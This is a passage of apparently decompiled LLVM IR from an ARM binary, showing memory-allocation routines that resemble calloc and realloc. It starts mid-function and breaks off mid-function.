  uselistorder i32 %v0_11ea4, { 1, 0, 2 }
  uselistorder i32 %v3_11e8c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11e88, { 1, 0 }
  uselistorder i32 %v2_11e6c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_11e64, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_11e1c, { 1, 2, 0 }
  uselistorder i32 %v0_11de4, { 1, 0 }
  uselistorder i32 %v0_11dd8, { 1, 0 }
  uselistorder i32 %v2_11dc8, { 1, 0 }
  uselistorder i32 %v2_11d58, { 2, 1, 0 }
  uselistorder i32 %v2_11d40, { 1, 2, 0, 3 }
  uselistorder i32 %v2_11d38, { 1, 0, 2 }
  uselistorder i32 %v1_11d34, { 2, 1, 0 }
  uselistorder i32 %v0_11d34, { 3, 1, 2, 0 }
  uselistorder i32 %v1_11d18, { 1, 0 }
  uselistorder i32 %v2_11cf0, { 1, 0 }
  uselistorder i32 %v3_11ce4, { 1, 0, 2 }
  uselistorder i32 %v2_11cc4, { 1, 0, 2 }
  uselistorder i32* %v2_11cbc, { 1, 0, 2 }
  uselistorder i32 %v0_11ca4, { 1, 0 }
  uselistorder i32 %v6_11c80, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11c6c, { 2, 1, 0 }
  uselistorder i32 %v0_11c54, { 1, 0 }
  uselistorder i32 %v2_11c10, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11c0c, { 1, 0 }
  uselistorder i32 %v3_11be4, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_11bc4, { 1, 0, 2 }
  uselistorder i32 %v2_11bac, { 1, 2, 0, 3 }
  uselistorder i32 %v1_11b54, { 2, 1, 0 }
  uselistorder i32 %v6_11b48, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_11b24, { 2, 1, 0, 3 }
  uselistorder i32 %v3_11ae4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11aa4, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_11a9c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11a98, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_11a84, { 1, 0 }
  uselistorder i32 %v7_11a44, { 1, 0 }
  uselistorder i32 %v4_11a44, { 1, 0 }
  uselistorder i32 %v0_11a14, { 1, 0 }
  uselistorder i32 %v2_119e8, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_119e454, { 1, 0 }
  uselistorder i32 %v1_119b0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_11998., { 1, 2, 0 }
  uselistorder i32 %v0_119a0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_119a0, { 1, 0 }
  uselistorder i32 %v3_11980, { 1, 0 }
  uselistorder i32 %v4_1197c, { 1, 0, 2 }
  uselistorder i32 %v1_118ec, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11944, { 1, 0 }
  uselistorder i32 %v1_11928, { 1, 0 }
  uselistorder i32 %v1_117c8, { 1, 0 }
  uselistorder i32 %v0_11908, { 2, 0, 1, 3 }
  uselistorder i32 %v3_118d0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11964.pre, { 1, 2, 0 }
  uselistorder i32 %v0_118ac, { 2, 1, 0 }
  uselistorder i32 %v3_118a0, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_117c0, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11868, { 1, 0 }
  uselistorder i32 %v3_1185c, { 1, 0 }
  uselistorder i32 %v0_11868, { 1, 0 }
  uselistorder i32 %v3_11840, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11830, { 1, 0, 2 }
  uselistorder i32 %v3_117e8, { 2, 1, 0 }
  uselistorder i32 %v0_117d8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_117a8, { 1, 0 }
  uselistorder i32 %v1_1175c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11758, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_116fc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_116f0, { 1, 0 }
  uselistorder i32 %v3_116c0, { 1, 0 }
  uselistorder i32 %v0_116b4, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_11694, { 0, 2, 1, 3 }
  uselistorder i1 %v7_11688, { 1, 0 }
  uselistorder i32 %v0_11660, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 10, 0, 1, 2, 3, 4, 6, 5, 14, 15, 7, 16, 8, 9, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 0, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 2, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 107, 108, 109, 98, 99, 100, 101, 102, 103, 104, 105, 106 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 54, 42, 43, 44, 45, 46, 55, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 9, 7, 32, 8, 10, 11, 2, 23, 15, 12, 24, 13, 14, 17, 16, 21, 18, 25, 20, 19, 26, 22, 1, 28, 27, 29, 5, 30, 33, 31, 37, 34, 35, 6, 36, 38, 39, 40, 41, 44, 45, 42, 43, 50, 47, 46, 48, 49, 3, 4, 51, 52, 53, 54, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 13, 12, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 42, 41, 28, 25, 1, 26, 27, 29, 36, 37, 38, 39, 40, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_138ec, { 1, 0 }
  uselistorder i32 (i32)* @function_1158c, { 1, 0 }
  uselistorder label %dec_label_pc_11ef8, { 1, 0 }
  uselistorder label %dec_label_pc_11edc, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_11ed8, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_11ec8, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_11e5c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_11dd8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11dd0, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11ca4, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_11bd8, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_11a90, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_119e4, { 1, 0 }
  uselistorder label %dec_label_pc_119ec.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_119b0, { 1, 0 }
  uselistorder label %dec_label_pc_11964, { 1, 0 }
  uselistorder label %dec_label_pc_118f8, { 1, 0 }
  uselistorder label %dec_label_pc_118f4, { 1, 0 }
  uselistorder label %dec_label_pc_118a0, { 1, 0 }
  uselistorder label %dec_label_pc_1188c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11854, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11840, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_11f0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_11f0c:
  %v0_11f0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f0c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_11f0c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11f0c, %bb
  %v10_11f20 = phi i32 [ %arg1, %dec_label_pc_11f0c ], [ 0, %bb ]
  ret i32 %v10_11f20

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_11f24(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11f24:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_11f24 = load i32, i32* @r4, align 4
  %v6_11f24 = load i32, i32* @r5, align 4
  %v9_11f24 = load i32, i32* @r6, align 4
  %v12_11f24 = load i32, i32* @lr, align 4
  %v2_11f2c = icmp eq i32 %arg1, 0
  store i32 add (i32 ptrtoint (i32* @global_var_c580.332 to i32), i32 73528), i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_11f3c = mul i32 %arg2, %arg1
  store i32 %v2_11f3c, i32* @r6, align 4
  br i1 %v2_11f2c, label %dec_label_pc_11f6c, label %dec_label_pc_11f44

dec_label_pc_11f44:                               ; preds = %dec_label_pc_11f24
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_11f3c, i32* @r0, align 4
  %v0_11f4c = call i32 @function_1067c()
  %v0_11f50 = load i32, i32* @r4, align 4
  %v9_11f50 = icmp eq i32 %v0_11f50, %v0_11f4c
  br i1 %v9_11f50, label %dec_label_pc_11f44.dec_label_pc_11f6c_crit_edge, label %dec_label_pc_11f58

dec_label_pc_11f44.dec_label_pc_11f6c_crit_edge:  ; preds = %dec_label_pc_11f44
  %v0_11f70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11f6c

dec_label_pc_11f58:                               ; preds = %dec_label_pc_11f44
  %v0_11f58 = call i32 @function_11008()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_11f64 = inttoptr i32 %v0_11f58 to i32*
  store i32 12, i32* %v2_11f64, align 4
  br label %dec_label_pc_12030

dec_label_pc_11f6c:                               ; preds = %dec_label_pc_11f44.dec_label_pc_11f6c_crit_edge, %dec_label_pc_11f24
  %v0_11f88 = phi i32 [ %v0_11f70.pre, %dec_label_pc_11f44.dec_label_pc_11f6c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_c580.332 to i32), i32 73528), %dec_label_pc_11f24 ]
  %v2_11f70 = add i32 %v0_11f88, 68
  %v3_11f70 = inttoptr i32 %v2_11f70 to i32*
  %v4_11f70 = load i32, i32* %v3_11f70, align 4
  store i32 %v4_11f70, i32* @r4, align 4
  %v2_11f88 = add i32 %v0_11f88, 72
  %v3_11f88 = inttoptr i32 %v2_11f88 to i32*
  %v4_11f88 = load i32, i32* %v3_11f88, align 4
  store i32 %v4_11f88, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11f88)
  %v0_11f9c = load i32, i32* @r5, align 4
  %v2_11f9c = add i32 %v0_11f9c, 16
  %v3_11f9c = inttoptr i32 %v2_11f9c to i32*
  %v4_11f9c = load i32, i32* %v3_11f9c, align 4
  store i32 %v4_11f9c, i32* %ip.global-to-local, align 4
  store i32 73640, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11f9c)
  %v0_11fa8 = load i32, i32* @r6, align 4
  %v1_11fac = call i32 @function_11604(i32 %v0_11fa8)
  store i32 %v1_11fac, i32* %r4.global-to-local, align 4
  %v2_11fb0 = icmp eq i32 %v1_11fac, 0
  br i1 %v2_11fb0, label %.thread, label %dec_label_pc_11fb8

dec_label_pc_11fb8:                               ; preds = %dec_label_pc_11f6c
  %v1_11fb8 = add i32 %v1_11fac, -4
  %v2_11fb8 = inttoptr i32 %v1_11fb8 to i32*
  %v3_11fb8 = load i32, i32* %v2_11fb8, align 4
  %v1_11fbc = and i32 %v3_11fb8, 2
  %v2_11fbc = icmp eq i32 %v1_11fbc, 0
  br i1 %v2_11fbc, label %dec_label_pc_11fc4, label %.thread

dec_label_pc_11fc4:                               ; preds = %dec_label_pc_11fb8
  %v1_11fc47 = add i32 %v3_11fb8, -4
  %v1_11fc8 = and i32 %v1_11fc47, -4
  store i32 %v1_11fc8, i32* @r2, align 4
  %v3_11fcc = udiv i32 %v1_11fc8, 4
  store i32 %v3_11fcc, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_11fc8, 36
  %v2_11fd4 = icmp ult i32 %v1_11fc8, 33
  %v3_11fd4 = or i1 %tmp, %v2_11fd4
  br i1 %v3_11fd4, label %dec_label_pc_11fe0, label %dec_label_pc_11fd8

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11fc4
  %v2_11fd8 = inttoptr i32 %v1_11fac to i8*
  %v3_11fd8 = call i32 @function_11060(i8* %v2_11fd8, i32 0)
  br label %.thread

dec_label_pc_11fe0:                               ; preds = %dec_label_pc_11fc4
  %tmp8 = icmp eq i32 %v1_11fc8, 16
  %v2_11fe4 = inttoptr i32 %v1_11fac to i32*
  store i32 0, i32* %v2_11fe4, align 4
  %v1_11fe8 = load i32, i32* %r4.global-to-local, align 4
  %v2_11fe8 = add i32 %v1_11fe8, 4
  %v3_11fe8 = inttoptr i32 %v2_11fe8 to i32*
  store i32 0, i32* %v3_11fe8, align 4
  %v1_11fec = load i32, i32* %r4.global-to-local, align 4
  %v2_11fec = add i32 %v1_11fec, 8
  %v3_11fec = inttoptr i32 %v2_11fec to i32*
  store i32 0, i32* %v3_11fec, align 4
  %v2_11ff0 = icmp ult i32 %v1_11fc8, 13
  %v3_11ff0 = or i1 %tmp8, %v2_11ff0
  br i1 %v3_11ff0, label %.thread, label %dec_label_pc_11ff4

dec_label_pc_11ff4:                               ; preds = %dec_label_pc_11fe0
  %v0_11ff4 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ff8 = load i32, i32* %r4.global-to-local, align 4
  %v2_11ff8 = add i32 %v1_11ff8, 12
  %v3_11ff8 = inttoptr i32 %v2_11ff8 to i32*
  store i32 0, i32* %v3_11ff8, align 4
  %v1_11ffc = load i32, i32* %r4.global-to-local, align 4
  %v2_11ffc = add i32 %v1_11ffc, 16
  %v3_11ffc = inttoptr i32 %v2_11ffc to i32*
  store i32 0, i32* %v3_11ffc, align 4
  %tmp9 = icmp ult i32 %v0_11ff4, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_12004

dec_label_pc_12004:                               ; preds = %dec_label_pc_11ff4
  %v0_12004 = load i32, i32* %ip.global-to-local, align 4
  %v7_12004 = icmp eq i32 %v0_12004, 9
  %v1_12008 = load i32, i32* %r4.global-to-local, align 4
  %v2_12008 = add i32 %v1_12008, 20
  %v3_12008 = inttoptr i32 %v2_12008 to i32*
  store i32 0, i32* %v3_12008, align 4
  %v1_1200c = load i32, i32* %r4.global-to-local, align 4
  %v2_1200c = add i32 %v1_1200c, 24
  %v3_1200c = inttoptr i32 %v2_1200c to i32*
  store i32 0, i32* %v3_1200c, align 4
  br i1 %v7_12004, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12004
  %v2_12010 = load i32, i32* %r4.global-to-local, align 4
  %v3_12010 = add i32 %v2_12010, 32
  %v4_12010 = inttoptr i32 %v3_12010 to i32*
  store i32 0, i32* %v4_12010, align 4
  %v2_12014 = load i32, i32* %r4.global-to-local, align 4
  %v3_12014 = add i32 %v2_12014, 28
  %v4_12014 = inttoptr i32 %v3_12014 to i32*
  store i32 0, i32* %v4_12014, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12004, %dec_label_pc_11fb8, %dec_label_pc_11ff4, %dec_label_pc_11fe0, %dec_label_pc_11f6c, %dec_label_pc_11fd8, %bb
  %v0_12024 = load i32, i32* @r5, align 4
  %v2_12024 = add i32 %v0_12024, 24
  %v3_12024 = inttoptr i32 %v2_12024 to i32*
  %v4_12024 = load i32, i32* %v3_12024, align 4
  store i32 %v4_12024, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_12024)
  br label %dec_label_pc_12030

dec_label_pc_12030:                               ; preds = %dec_label_pc_11f58, %.thread
  %v0_12030 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_11f24, i32* @r4, align 4
  store i32 %v6_11f24, i32* @r5, align 4
  store i32 %v9_11f24, i32* @r6, align 4
  store i32 %v12_11f24, i32* @lr, align 4
  ret i32 %v0_12030

; uselistorder directives
  uselistorder i32 %v1_11fc8, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_11fac, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 33, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12030, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_12044(i32 %arg1) local_unnamed_addr {
dec_label_pc_12044:
  %v0_12044 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12044, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12044
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12044, %bb
  %v10_12054 = phi i32 [ %arg1, %dec_label_pc_12044 ], [ 0, %bb ]
  ret i32 %v10_12054

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_12058(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12058:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12058 = load i32, i32* @r4, align 4
  %v6_12058 = load i32, i32* @r5, align 4
  %v9_12058 = load i32, i32* @r6, align 4
  %v12_12058 = load i32, i32* @r7, align 4
  %v15_12058 = load i32, i32* @r8, align 4
  %v18_12058 = load i32, i32* @sb, align 4
  %v21_12058 = load i32, i32* @sl, align 4
  %v24_12058 = load i32, i32* @fp, align 4
  %v27_12058 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12064 = icmp eq i32* %arg1, null
  store i32 124088, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12064, label %dec_label_pc_12078, label %dec_label_pc_12088

dec_label_pc_12078:                               ; preds = %dec_label_pc_12058
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_1207c = call i32 @function_11604(i32 %arg2)
  store i32 %v1_1207c, i32* %r0.global-to-local, align 4
  store i32 %v1_1207c, i32* @r4, align 4
  br label %dec_label_pc_123e0

dec_label_pc_12088:                               ; preds = %dec_label_pc_12058
  %v2_12088 = icmp eq i32 %arg2, 0
  br i1 %v2_12088, label %dec_label_pc_12090, label %dec_label_pc_1209c

dec_label_pc_12090:                               ; preds = %dec_label_pc_12088
  %v0_12090 = call i32 @function_12670()
  store i32 %v0_12090, i32* %r0.global-to-local, align 4
  %v0_12094 = load i32, i32* @r6, align 4
  store i32 %v0_12094, i32* @r4, align 4
  br label %dec_label_pc_123e0

dec_label_pc_1209c:                               ; preds = %dec_label_pc_12088
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_120a4 = load i32, i32* inttoptr (i32 124156 to i32*), align 4
  store i32 %v4_120a4, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_120a4, i32* %r2.global-to-local, align 4
  %v4_120b0 = load i32, i32* inttoptr (i32 124124 to i32*), align 4
  store i32 %v4_120b0, i32* %r1.global-to-local, align 4
  %v2_120b4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_120b4, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_120bc = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  call void @__pseudo_branch(i32 %v4_120bc)
  %v0_120c8 = load i32, i32* @r4, align 4
  store i32 %v0_120c8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r1.global-to-local, align 4
  %v4_120d4 = load i32, i32* inttoptr (i32 124104 to i32*), align 8
  store i32 %v4_120d4, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_120e0.343 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_120d4)
  %v0_120e0 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_120e0, -32
  br i1 %tmp36, label %dec_label_pc_120fc, label %dec_label_pc_120e8

dec_label_pc_120e8:                               ; preds = %dec_label_pc_1209c
  %v0_120e8 = call i32 @function_11008()
  store i32 %v0_120e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_120f4 = inttoptr i32 %v0_120e8 to i32*
  store i32 12, i32* %v2_120f4, align 4
  br label %dec_label_pc_123e0

dec_label_pc_120fc:                               ; preds = %dec_label_pc_1209c
  %v1_120fc = add i32 %v0_120e0, 11
  store i32 %v1_120fc, i32* %r0.global-to-local, align 4
  %v0_12100 = load i32, i32* @r5, align 4
  %v1_12100 = add i32 %v0_12100, -4
  %v2_12100 = inttoptr i32 %v1_12100 to i32*
  %v3_12100 = load i32, i32* %v2_12100, align 4
  store i32 %v3_12100, i32* %r2.global-to-local, align 4
  %v2_12104 = icmp ugt i32 %v1_120fc, 14
  %v7_12104 = icmp eq i32 %v1_120fc, 15
  %v2_12108 = xor i1 %v2_12104, true
  %v3_12108 = or i1 %v7_12104, %v2_12108
  br i1 %v3_12108, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_120fc
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_120fc, %bb
  %v2_1210c = xor i1 %v7_12104, true
  %v3_1210c = and i1 %v2_12104, %v2_1210c
  br i1 %v3_1210c, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_1210c = and i32 %v1_120fc, -8
  store i32 %v5_1210c, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_12110 = and i32 %v3_12100, 2
  %v2_12110 = icmp eq i32 %v1_12110, 0
  %v1_12114 = add i32 %v0_12100, -8
  store i32 %v1_12114, i32* @sl, align 4
  %v1_12118 = and i32 %v3_12100, -4
  store i32 %v1_12118, i32* @r6, align 4
  br i1 %v2_12110, label %dec_label_pc_12120, label %dec_label_pc_122f8

dec_label_pc_12120:                               ; preds = %bb29
  %v1_12120 = load i32, i32* @sb, align 4
  %v3_12120 = icmp ult i32 %v1_12118, %v1_12120
  br i1 %v3_12120, label %dec_label_pc_1212c, label %bb30

bb30:                                             ; preds = %dec_label_pc_12120
  store i32 %v1_12118, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12290

dec_label_pc_1212c:                               ; preds = %dec_label_pc_12120
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12134 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_12134, i32* %r0.global-to-local, align 4
  %v1_12138 = add i32 %v4_12134, 44
  %v2_12138 = inttoptr i32 %v1_12138 to i32*
  %v3_12138 = load i32, i32* %v2_12138, align 4
  store i32 %v3_12138, i32* %r3.global-to-local, align 4
  %v2_1213c = add i32 %v1_12118, %v1_12114
  store i32 %v2_1213c, i32* @r4, align 4
  %v9_12140 = icmp eq i32 %v2_1213c, %v3_12138
  %v1_12144 = add i32 %v2_1213c, 4
  %v2_12144 = inttoptr i32 %v1_12144 to i32*
  %v3_12144 = load i32, i32* %v2_12144, align 4
  store i32 %v3_12144, i32* %r1.global-to-local, align 4
  br i1 %v9_12140, label %dec_label_pc_1214c, label %dec_label_pc_12188

dec_label_pc_1214c:                               ; preds = %dec_label_pc_1212c
  %v1_1214c = and i32 %v3_12144, -4
  %v2_12150 = add i32 %v1_1214c, %v1_12118
  store i32 %v2_12150, i32* %r1.global-to-local, align 4
  %v1_12154 = add i32 %v1_12120, 16
  store i32 %v1_12154, i32* %r3.global-to-local, align 4
  %v3_12158 = icmp ult i32 %v2_12150, %v1_12154
  br i1 %v3_12158, label %dec_label_pc_121dc, label %dec_label_pc_12160

dec_label_pc_12160:                               ; preds = %dec_label_pc_1214c
  %v2_12160 = sub i32 %v2_12150, %v1_12120
  %v1_12164 = urem i32 %v3_12100, 2
  %v2_12168 = add i32 %v1_12120, %v1_12114
  store i32 %v2_12168, i32* %r1.global-to-local, align 4
  %v2_1216c = or i32 %v1_12120, %v1_12164
  store i32 %v2_1216c, i32* %r2.global-to-local, align 4
  %v1_12170 = or i32 %v2_12160, 1
  store i32 %v1_12170, i32* %r3.global-to-local, align 4
  store i32 %v0_12100, i32* @r4, align 4
  store i32 %v2_1216c, i32* %v2_12100, align 4
  %v0_1217c = load i32, i32* %r1.global-to-local, align 4
  %v1_1217c = load i32, i32* %r0.global-to-local, align 4
  %v2_1217c = add i32 %v1_1217c, 44
  %v3_1217c = inttoptr i32 %v2_1217c to i32*
  store i32 %v0_1217c, i32* %v3_1217c, align 4
  %v0_12180 = load i32, i32* %r3.global-to-local, align 4
  %v1_12180 = load i32, i32* %r1.global-to-local, align 4
  %v2_12180 = add i32 %v1_12180, 4
  %v3_12180 = inttoptr i32 %v2_12180 to i32*
  store i32 %v0_12180, i32* %v3_12180, align 4
  br label %dec_label_pc_123c4

dec_label_pc_12188:                               ; preds = %dec_label_pc_1212c
  %v1_12188 = and i32 %v3_12144, -2
  %v2_1218c = add i32 %v1_12188, %v2_1213c
  store i32 %v2_1218c, i32* %r3.global-to-local, align 4
  %v1_12190 = add i32 %v2_1218c, 4
  %v2_12190 = inttoptr i32 %v1_12190 to i32*
  %v3_12190 = load i32, i32* %v2_12190, align 4
  store i32 %v3_12190, i32* %r3.global-to-local, align 4
  %v1_12194 = urem i32 %v3_12190, 2
  %v2_12194 = icmp eq i32 %v1_12194, 0
  br i1 %v2_12194, label %dec_label_pc_1219c, label %dec_label_pc_121dc

dec_label_pc_1219c:                               ; preds = %dec_label_pc_12188
  %v1_1219c = and i32 %v3_12144, -4
  store i32 %v1_1219c, i32* %r3.global-to-local, align 4
  %v2_121a0 = add i32 %v1_1219c, %v1_12118
  store i32 %v2_121a0, i32* %r0.global-to-local, align 4
  %v3_121a4 = icmp ult i32 %v2_121a0, %v1_12120
  br i1 %v3_121a4, label %dec_label_pc_121dc, label %dec_label_pc_121ac

dec_label_pc_121ac:                               ; preds = %dec_label_pc_1219c
  %v1_121ac = add i32 %v1_12118, %v0_12100
  %v2_121ac = inttoptr i32 %v1_121ac to i32*
  %v3_121ac = load i32, i32* %v2_121ac, align 4
  store i32 %v3_121ac, i32* %r1.global-to-local, align 4
  %v1_121b0 = add i32 %v3_121ac, 12
  %v2_121b0 = inttoptr i32 %v1_121b0 to i32*
  %v3_121b0 = load i32, i32* %v2_121b0, align 4
  store i32 %v3_121b0, i32* %r3.global-to-local, align 4
  %v9_121b4 = icmp eq i32 %v3_121b0, %v2_1213c
  %v1_121b8 = add i32 %v2_1213c, 12
  %v2_121b8 = inttoptr i32 %v1_121b8 to i32*
  %v3_121b8 = load i32, i32* %v2_121b8, align 4
  store i32 %v3_121b8, i32* %r2.global-to-local, align 4
  br i1 %v9_121b4, label %dec_label_pc_121c0, label %dec_label_pc_121cc

dec_label_pc_121c0:                               ; preds = %dec_label_pc_121ac
  %v1_121c0 = add i32 %v3_121b8, 8
  %v2_121c0 = inttoptr i32 %v1_121c0 to i32*
  %v3_121c0 = load i32, i32* %v2_121c0, align 4
  store i32 %v3_121c0, i32* %r3.global-to-local, align 4
  %v9_121c4 = icmp eq i32 %v3_121c0, %v2_1213c
  br i1 %v9_121c4, label %dec_label_pc_121d0, label %dec_label_pc_121cc

dec_label_pc_121cc:                               ; preds = %dec_label_pc_121ac, %dec_label_pc_121c0
  %v0_121cc = call i32 @function_128ec()
  store i32 %v0_121cc, i32* %r0.global-to-local, align 4
  %v0_121d0.pre = load i32, i32* @r1, align 4
  %v1_121d0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_121d0

dec_label_pc_121d0:                               ; preds = %dec_label_pc_121c0, %dec_label_pc_121cc
